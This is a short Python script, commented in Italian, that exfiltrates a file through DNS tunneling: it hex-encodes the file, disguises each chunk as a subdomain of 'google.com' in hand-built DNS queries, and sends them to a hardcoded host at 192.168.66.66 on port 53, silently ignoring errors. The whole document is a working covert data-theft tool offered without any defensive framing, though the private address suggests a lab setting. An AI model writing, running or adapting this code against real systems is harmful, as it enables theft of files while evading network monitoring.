import socket
import sys
import time
import binascii
import os

DEST_IP = "192.168.66.66"  
DEST_PORT = 53
FAKE_DOMAIN = "google.com"

def build_dns_query(subdomain):
    """Costruisce un pacchetto DNS Query grezzo (senza Scapy)"""
    
    tid = b'\xaa\xbb' 
    flags = b'\x01\x00' 
    header = tid + flags + b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00'
    
    # QNAME encoding (es. 3www6google3com0)
    qname = b''
    full_domain = subdomain + "." + FAKE_DOMAIN
    for part in full_domain.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00' 
    
    tail = b'\x00\x01\x00\x01'
    
    return header + qname + tail

def exfiltrate(filename):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        if not os.path.exists(filename):
            return

        with open(filename, 'rb') as f:
            content = f.read()
        
        hex_data = binascii.hexlify(content).decode()
        
        chunk_size = 30
        
        for i in range(0, len(hex_data), chunk_size):
            chunk = hex_data[i:i+chunk_size]
            
            pkt = build_dns_query(chunk)
            sock.sendto(pkt, (DEST_IP, DEST_PORT))
            
            time.sleep(0.05)
            
        pkt = build_dns_query("eof")
        sock.sendto(pkt, (DEST_IP, DEST_PORT))
        
    except Exception as e:
        pass

if __name__ == "__main__":
    if len(sys.argv) > 1:
        exfiltrate(sys.argv[1])